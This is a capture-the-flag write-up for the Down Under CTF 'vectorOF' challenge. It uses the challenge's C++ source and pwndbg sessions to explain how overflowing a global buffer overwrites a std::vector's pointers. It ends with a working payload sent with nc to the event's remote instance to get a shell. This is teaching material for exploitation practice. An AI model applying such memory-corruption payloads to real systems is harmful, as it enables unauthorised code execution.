@@ -1,0 +1,202 @@
+Down Under CTF: pwn: vectorOF
+-------------------------------------------------------------------------------
+
+Solution: 
+
+The vulnerability in this challenge is, as the name states, a buffer
+overflow. We are fortunately provided the source code:  
+
+
+===============================================================================
+char buf[16];
+std::vector<char> v = {'X', 'X', 'X', 'X', 'X'};
+
+void lose() {
+    puts("Bye!");
+    exit(1);
+}
+
+void win() {
+    system("/bin/sh");
+    exit(0);
+}
+
+int main() {
+    char ductf[6] = "DUCTF";
+    char* d = ductf;
+
+    std::cin >> buf;
+    if(v.size() == 5) {
+        for(auto &c : v) {
+            if(c != *d++) {
+                lose();
+            }
+        }
+
+        win();
+    }
+
+    lose();
+}
+===============================================================================
+
+Does anything stand out to you? My first question was... does cin allow us to
+overflow the buf variable? A simple test will allow us to determine this.
+Using python we can run the binary and provide input large enough to overflow
+the buf variable and see what happens. 
+
+	python -c "print 'A' * 17" | ./vector_overflow
+
+This gives an error stating:  
+
+	free(): invalid pointer
+
+Interesting. Looking at this in pwndbg should give us some more information 
+about what is going on here. The first thing I did was disassemble main. 
+
+	disass main
+
+This will show us the assembly and allows the addresses for buf and the vector
+to be determined. The addresses may vary on your local system. On mine, they
+are as follows: 
+
+	buf = 0x4051e0
+	v   = 0x4051f0
+
+With these determined, the next thing to do is to find the cin call. I set a
+break point here and ran the program. Using the next instruction command (ni)
+we can step through execution and provide an input of 20 'A' characters and 
+stopping immediately after input. Lets examine the addresses of buf and
+v now. 
+
+	pwndbg> x /s 0x4051e0
+		0x4051e0 <buf>: 'A' <repeats 20 times>
+
+	pwndbg> x /s 0x4051f0
+		0x4051f0 <v>:   "AAAA"
+
+Nice! We can see our buffer gets filled as expected. BUT, the vector also gets
+filled (buffer overflow). This happens because of the way these variables are
+layed out on the stack. Looking at the source code above, notice that they are
+defined next to each other, and as a result, are pushed onto the stack next to
+each other. 
+
+We now know that we can write into this buffer and overflow into the vector.
+How to take advantage of this? Lets consult the source code. 
+
+===============================================================================
+    std::cin >> buf;
+    if(v.size() == 5) {
+        for(auto &c : v) {
+            if(c != *d++) {
+                lose();
+            }
+        }
+
+        win();
+    }
+===============================================================================
+
+We are aiming for the win() function as it uses the system() call to execute 
+"/bin/sh", thus giving us a shell. This is triggered on the condition that the
+size of the vector is 5 and that each character in the vector is equivalent to
+each character in the pointer named "d". What is "d"? 
+
+    char ductf[6] = "DUCTF";
+    char* d = ductf;
+
+We can see that "d" simply is a pointer to the character array containing the
+string "DUCTF". Hmmmmmmmmm?
+
+Can we simply write "DUCTF" into the vector??
+
+	python -c "print 'A'*16 + 'DUCTF'" | ./vector_overflow
+
+This fails. Why? pwndbg! 
+
+There are few places where this could fail so lets start checking one by one.
+To start, I ran the same payload but paused execution to examine the values
+stored at "buf" and "v". 
+
+	pwndbg> x /s 0x4051e0
+		0x4051e0 <buf>: 'A' <repeats 16 times>, "DUCTF"
+	pwndbg> x /s 0x4051f0
+		0x4051f0 <v>:   "DUCTF"
+
+It looks like our 'DUCTF' string is getting stored in the vector properly.
+That is good to know. What else? The size! Lets put a breakpoint on the
+function that checks the size of the vector. The first time through testing
+this, I simply stepped over the function and looked at the value stored in RAX
+(the return value). This value gets compared to 5 immediately after the size()
+call. It is definitely not 5. 
+
+Well, now we know where the failure is. Why is it happening though? 'DUCTF' is
+clearly 5 characters. Lets rerun the program with the same input and this time
+step-into the size() function. We can see that the return value is determine
+by a subtraction instruction. It looks as follows: 
+
+	sub    rax, rcx     RAX => 0xffffffb9abfe2971 (0x417eb5 - 0x4654435544)
+
+Okay. What are these values? Lets examine the memory of our vector once again,
+this time in both hex and string formats. 
+
+	pwndbg> x /10wx 0x4051f0
+		0x4051f0 <v>:   0x54435544  0x00000046  0x00417eb5  0x00000000
+
+
+	pwndbg> x /10s 0x4051f0
+		0x4051f0 <v>:   "DUCTF"
+		0x4051f6 <v+6>: ""
+		0x4051f7 <v+7>: ""
+		0x4051f8 <v+8>: "\265~A"
+
+What information does this give us? Looking carefully at this information is
+essential. We can see that the hex value for the string 'DUCTF' is being used
+in the subtraction instruction. Why is this?
+
+Because a vector stores POINTERS to the beginning and end of the data that it
+is storing. The size function subtracts the end pointer from the start pointer
+in order to determine the size. This was a light bulb moment for me. 
+
+
+	  ..---..
+	 /       \
+	|         |
+	:         ;
+	 \  \~/  /
+	  `, Y ,'
+	   |_|_|
+	   |===|
+	   |===|
+	    \_/
+
+Armed with this information, what are you thinking? This is a good point to
+minimize the writeup and try on your own. 
+
+The goal is to write pointers to vector address. What pointers? Pointers that
+contain the string 'DUCTF' since we will still need to pass the comparison
+logic in the for loop. We have an option here. We already have a string
+'DUCTF' provided to us in the "d" pointer. Additionally, we have control over
+the "buf" variable. If we can determine the start address of either of these
+strings, we are in business. We need to write the start address into the first
+8-bytes of the vector and then add 5-bytes to the start address and write that
+into the vector. We need to maintain alignment so there may be 0-padding
+needed when writing into the vector. 
+
+I used the "buf" variable and my payload is as follows: 
+
+	(python -c "print 'DUCTF' + '\x00' * 11 + '\xe0\x51\x40' + '\x00' * 5 +
+	 '\xe5\x51\x40' + '\x00' * 5";cat) | nc 2024.ductf.dev 30013 
+
+This is for the remote instance provided for the CTF. Notice the usage of
+"cat". See this post for a good explanation by Arusekk:
+
+	https://stackoverflow.com/questions/64562712/why-use-cat-to-open-
+	interactive-shell
+
+The payload will not work without it. It is likely that you will need 
+something similar in future CTF's. I'll leave it to the reader to translate 
+this payload in order for it to work locally. 
+
+Happy hacking :)
+
